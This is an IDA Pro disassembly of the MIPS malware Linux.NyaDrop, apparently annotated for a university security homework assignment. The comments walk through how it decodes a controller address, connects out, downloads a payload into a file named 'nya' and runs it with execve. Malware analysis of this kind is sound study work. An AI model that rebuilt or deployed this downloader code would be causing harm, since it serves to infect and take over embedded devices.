LOAD:00400000  #
LOAD:00400000  # +-------------------------------------------------------------------------+
LOAD:00400000  # |      This file was generated by The Interactive Disassembler (IDA)      |
LOAD:00400000  # |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
LOAD:00400000  # |                      License info: 48-BABB-7E64-E2                      |
LOAD:00400000  # |                     Georgia Institute of Technology                     |
LOAD:00400000  # +-------------------------------------------------------------------------+
LOAD:00400000  #
LOAD:00400000  # Input SHA256 : C3865EB1C211DE6435D1352647C023C2606F9285D3304D54F17261A16BBEC5FF
LOAD:00400000  # Input MD5    : 752E353A88B6E3E5E5A60891BA06A065
LOAD:00400000  # Input CRC32  : A5E4E7FC
LOAD:00400000
LOAD:00400000  # File Name   : /nethome/hmiyaziwala3/4894/HW7/Linux.NyaDrop
LOAD:00400000  # Format      : ELF for MIPS (Executable)
LOAD:00400000  # Imagebase   : 400000
LOAD:00400000  #
LOAD:00400000  # Options     : -fCPIC
LOAD:00400000  # Options     : --mips2
LOAD:00400000  # Options     : --o32
LOAD:00400000  #
LOAD:00400000
LOAD:00400000  # Processor       : mipsb
LOAD:00400000  # Target assembler: GNU assembler
LOAD:00400000  # Byte sex        : Big endian
LOAD:00400000
LOAD:00400000 .set noreorder
LOAD:00400000 .set noat
LOAD:00400000
LOAD:00400000
LOAD:00400000  # ===========================================================================
LOAD:00400000
LOAD:00400000  # Segment type: Pure code
LOAD:00400000                 .text # LOAD
LOAD:00400000 dword_400000:   .word 0x7F454C46         # DATA XREF: LOAD:0040005C↓o
LOAD:00400000                                          # File format: \x7FELF
LOAD:00400004                 .byte 1                  # File class: 32-bit
LOAD:00400005                 .byte 2                  # Data encoding: big-endian
LOAD:00400006                 .byte 1                  # File version
LOAD:00400007                 .byte 0                  # OS/ABI: UNIX System V ABI
LOAD:00400008                 .byte 0                  # ABI Version
LOAD:00400009                 .byte 0, 0, 0, 0, 0, 0, 0  # Padding
LOAD:00400010                 .half 2                  # File type: Executable
LOAD:00400012                 .half 8                  # Machine: MIPS
LOAD:00400014                 .word 1                  # File version
LOAD:00400018                 .word start              # Entry point
LOAD:0040001C                 .word 0x34               # PHT file offset
LOAD:00400020                 .word 0x1F4              # SHT file offset
LOAD:00400024                 .word 0x10001004         # Processor-specific flags
LOAD:00400028                 .half 0x34               # ELF header size
LOAD:0040002A                 .half 0x20               # PHT entry size
LOAD:0040002C                 .half 2                  # Number of entries in PHT
LOAD:0040002E                 .half 0x28               # SHT entry size
LOAD:00400030                 .half 3                  # Number of entries in SHT
LOAD:00400032                 .half 2                  # SHT entry index for string table
LOAD:00400034  # ELF32 Program Header
LOAD:00400034  # PHT Entry 0
LOAD:00400034                 .word 0x70000000         # Type: REGINFO
LOAD:00400038                 .word 0                  # File offset
LOAD:0040003C                 .word 0                  # Virtual address
LOAD:00400040                 .word 0                  # Physical address
LOAD:00400044                 .word 0                  # Size in file image
LOAD:00400048                 .word 0                  # Size in memory image
LOAD:0040004C                 .word 4                  # Flags
LOAD:00400050                 .word 4                  # Alignment
LOAD:00400054  # PHT Entry 1
LOAD:00400054                 .word 1                  # Type: LOAD
LOAD:00400058                 .word 0                  # File offset
LOAD:0040005C                 .word dword_400000       # Virtual address
LOAD:00400060                 .word 0x400000           # Physical address
LOAD:00400064                 .word 0x1E0              # Size in file image
LOAD:00400068                 .word 0x1E0              # Size in memory image
LOAD:0040006C                 .word 5                  # Flags
LOAD:00400070                 .word 0x10000            # Alignment
LOAD:00400074                 .word 0, 0, 0, 0, 0, 0, 0
LOAD:00400074
.text:00400090  # ===========================================================================
.text:00400090
.text:00400090  # Segment type: Pure code
.text:00400090                 .text
.text:00400090
.text:00400090  # =============== S U B R O U T I N E =======================================
.text:00400090
.text:00400090  # zero register now contains 10
.text:00400090
.text:00400090                 .globl start
.text:00400090 start:                                   # DATA XREF: LOAD:00400018↑o
.text:00400090
.text:00400090 var_800         = -0x800
.text:00400090 var_18          = -0x18
.text:00400090 arg_0           =  0
.text:00400090 arg_4           =  4
.text:00400090 arg_64          =  0x64
.text:00400090 arg_68          =  0x68
.text:00400090
.text:00400090                 addiu   $zero, 10        # not possible, the value is discarded (or error on emulators)
.text:00400094                 lw      $a0, arg_0($sp)  # grab whatever is at the sp (arg0)
.text:00400098                 addiu   $a1, $sp, arg_4  # a1 = sp + 4 (arg1's address)
.text:0040009C                 addiu   $a2, $a0, 1      # increment arg0 and save
.text:004000A0                 sll     $a2, 2           # shift it up two bytes
.text:004000A4                 add     $s0, $a2, $a1    # This seems like some IP or seed generator routine
.text:004000A8                 li      $v0, 0x1057      # syscall socket (int domain, int type, int protocol)
.text:004000AC                 li      $a0, 2           # domain = 2, AF_INET
.text:004000B0                 li      $a1, 2           # type = 2, SOCK_STREAM
.text:004000B4                 li      $a2, 0           # protocol = 0, IPPROTO_IP
.text:004000B8                 syscall 0                # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
.text:004000BC                 move    $s1, $v0         # store returned file descriptor endpoint of socket
.text:004000C0                 li      $v0, 0x6E796100  # load string "nya" into v0
.text:004000C8                 sw      $v0, arg_0($sp)  # store "nya" onto stack
.text:004000CC                 li      $v0, 4005        # syscall open(const char *pathname, int flags, mode_t mode)
.text:004000D0                 move    $a0, $sp         # pathname pointer = pointer to "nya" string
.text:004000D4                 li      $a1, 0x101       # int flags = O_WRONLY | O_CREAT
.text:004000D8                 li      $a2, 0xFFFF      # some chmod-y flag, publicly readable/executable
.text:004000DC                 syscall 0                # open("nya", O_WRONLY | O_CREAT)
.text:004000E0                 move    $s2, $v0         # save result of file open into s2
.text:004000E4                 addi    $s3, $sp, var_18 # sp-18 address to s3
.text:004000E8                 addi    $s4, $sp, arg_4  # sp+4 (arg1 address) to s4
.text:004000EC                 lw      $s4, 4($s4)      # [sp+4+4] (arg2) loaded to s4
.text:004000F0                 li      $v0, 2           # v0 = 2
.text:004000F4                 sb      $zero, 0($s3)    # [sp-18] = 0, beginning of sockaddr struct {ushort sa_family, sa_data[14]}
.text:004000F8                 sb      $v0, 1($s3)      # [sp-18+1] = 1, ushort sa_family = AF_INET = 2
.text:004000FC                 li      $t0, 7           # t0 = 7, preparing loop to generate: sa_data[14] two bytes at a time
.text:00400100                 addi    $t1, $s3, 2      # t1 = sp-18 address + 2
.text:00400104                 move    $t2, $s4         # t2 = [sp+4+4] (arg2)
.text:00400108                 addiu   $zero, 0xA       # not possible, the value is discarded (or error on emulators)
.text:0040010C
.text:0040010C loc_40010C:                              # CODE XREF: start+B0↓j
.text:0040010C                 move    $v0, $zero       # beginning of IP generation routine, v0 = 0
.text:00400110                 move    $v1, $zero       # v1 = 0
.text:00400114                 lb      $v0, 0($t2)      # v0 = (T2)
.text:00400118                 lb      $v1, 1($t2)      # v1 = (T2), next byte
.text:0040011C                 addi    $v0, -0x41       # subtract 0x41 ->1000001b from v0
.text:00400120                 addi    $v1, -0x41       # subtract 0x41 from v1
.text:00400124                 sll     $v0, 4           # push up 4 bits, make room
.text:00400128                 or      $v0, $v1         # append -> v0 = [v0 v1]
.text:0040012C                 sb      $v0, 0($t1)      # write to address pointed to by t1
.text:00400130                 addi    $t0, -1          # t0--
.text:00400134                 addi    $t1, 1           # t1++
.text:00400138                 beqz    $t0, loc_400148  # if we are done (8 loops) jump to connection code
.text:0040013C                 addi    $t2, 2           # if not done, t2 += 2
.text:00400140                 j       loc_40010C       #  continue initalizaiton, jump back up
.text:00400144                 move    $at, $at         # unreachable
.text:00400148  # ---------------------------------------------------------------------------
.text:00400148
.text:00400148 loc_400148:                              # CODE XREF: start+A8↑j
.text:00400148                 addiu   $zero, 0xA       # not possible, the value is discarded (or error on emulators)
.text:0040014C                 li      $v0, 4170        # syscall connect(sockfd, struct sock addr * &serv_addr, sizeof(serv_addr))
.text:00400150                 move    $a0, $s1         # sockfd =  socket handle from earlier socket() call
.text:00400154                 move    $a1, $s3         # &serv_addr = ref to [sp-18] (a sock addr struct!),
.text:00400158                 li      $a2, 16          # addrlen = 16
.text:0040015C                 syscall 0                # connect() (to the malware controller/distributer), returns error if any
.text:00400160
.text:00400160 loc_400160:                              # CODE XREF: start+104↓j
.text:00400160                 li      $v0, 4175        # recv(int sockfd, void *buf, size_t len, int flags) call
.text:00400164                 move    $a0, $s1         # sockfd = socket handle from earlier socket() call
.text:00400168                 addi    $a1, $sp, var_800  # void *buf = -0x800, some location way down there for the recv
.text:0040016C                 li      $a2, 0x400       # len = 0x400, size of whatever new malware?
.text:00400170                 syscall 0                # recv() call, download the new malware
.text:00400174                 bnez    $a3, loc_4001D4  # exit if errored
.text:00400178                 move    $a2, $v0         # grab return from recv
.text:0040017C                 blez    $v0, loc_40019C  # if zero, as in no more data received/end of new malware downloaded, jump to execution
.text:00400180                 move    $at, $at         # discarded
.text:00400184                 li      $v0, 0xFA4       # syscall write(int fd, const void *buf, size_t count)
.text:00400188                 move    $a0, $s2         # fd = "nya" file pointer
.text:0040018C                 addi    $a1, $sp, var_800  # *buf = data brought in from recv
.text:00400190                 syscall 0                # write data received (malware) to nya file
.text:00400194                 j       loc_400160       # get the next 'stream/batch' (more like next <= 0x400 bytes of malware) if any
.text:00400198                 move    $at, $at         # unreachable?
.text:0040019C  # ---------------------------------------------------------------------------
.text:0040019C
.text:0040019C loc_40019C:                              # CODE XREF: start+EC↑j
.text:0040019C                 li      $v0, 0xFA6       # syscall close(int fd)
.text:004001A0                 move    $a0, $s1         # fd = socket end point
.text:004001A4                 syscall 0                # call close() on socket
.text:004001A8                 li      $v0, 0xFA6       # syscall close(int fd)
.text:004001AC                 move    $a0, $s2         # fd = nya malware file
.text:004001B0                 syscall 0                # close nya file
.text:004001B4                 sw      $sp, arg_64($sp) # store pointer to "nya" file name at [sp + arg_64]
.text:004001B8                 sw      $zero, arg_68($sp) # save zero to the word after it, null terminating
.text:004001BC                 addiu   $zero, 0xA         # discarded
.text:004001C0                 li      $v0, 0xFAB         # syscall execve(const char *pathname, char *const argv[], char *const envp[])
.text:004001C4                 move    $a0, $sp           # sp = nya, *pathname = nya
.text:004001C8                 addi    $a1, $sp, arg_64   # * argv = arg_64(sp) null terminated, basically argv[0] has to equal the filename too
.text:004001CC                 move    $a2, $s0           # restoring the ip seed as the environment
.text:004001D0                 syscall 0                  # executing the malware downloaded
.text:004001D4
.text:004001D4 loc_4001D4:                              # CODE XREF: start+E4↑j
.text:004001D4                 addiu   $zero, 0xA       # Stop
.text:004001D8                 move    $at, $at         # Stop
.text:004001DC                 move    $at, $at         # Stop
.text:004001DC  # End of function start
.text:004001DC
.text:004001DC
.text:004001DC                  # end start
